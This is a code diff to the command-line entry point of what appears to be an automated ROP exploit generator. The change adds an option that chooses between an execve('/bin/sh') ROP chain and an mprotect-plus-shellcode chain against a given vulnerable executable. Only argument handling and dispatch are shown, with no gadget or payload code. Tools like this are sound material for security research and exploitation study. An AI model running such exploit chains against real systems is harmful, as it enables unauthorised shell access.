@@ -24,15 +24,24 @@ if __name__ == "__main__":
     parser.add_argument("-l", "--length", dest="length",
                         help="Max number of bytes to traverse above c3", metavar="NUM")
 
+    parser.add_argument("-e", "--exploitType", dest="exploitType")
+
     args = parser.parse_args()
 
     if(args.filename == None):
-        print("Use the --flag or -f flag to enter the vulnerable executable!")
+        print("Use the --file or -f flags to enter the vulnerable executable!")
         exit(1)
 
     if(args.length == None):
         print("Use the --length or -l flag to enter the max number of bytes to traverse above c3!")
-        exit(10)
+        exit(1)
+
+    if(args.exploitType == None): 
+        print("Use the --exploitType flag to enter the type of exploit you need. ")
+        print("There are 2 types of exploit as of now: ")
+        print("1. 'execve' : Standard execve('/bin/sh', 0, 0) ROP shellcode")
+        print("2. 'mprotect' : mprotect() ROP Shellcode combined with execve traditional shellcode")
+        exit(1)
 
     vulnExecutable = str(args.filename)
 
@@ -65,7 +74,16 @@ if __name__ == "__main__":
 
     general.ALLGADGETS = categorize.categorize(TwoInstGadgets)
 
-    # execveChain.execveROPChain(general.ALLGADGETS, vulnExecutable)
 
-    # As of now, mprotect system call is failing for some reason. Will figure it out.
-    mprotectChain.mprotectROPChain(general.ALLGADGETS, vulnExecutable)
+    # execve() ROP Shellcode
+    if args.exploitType == "execve" : 
+        execveChain.execveROPChain(general.ALLGADGETS, vulnExecutable)
+    
+    # mprotect() ROP Shellcode + execve() traditional Shellcode
+    elif args.exploitType == "mprotect" : 
+        mprotectChain.mprotectROPChain(general.ALLGADGETS, vulnExecutable)
+    
+    # If we don't have the exploit
+    else: 
+        print("These are the only 2 exploits we support as of now")
+        exit(1)
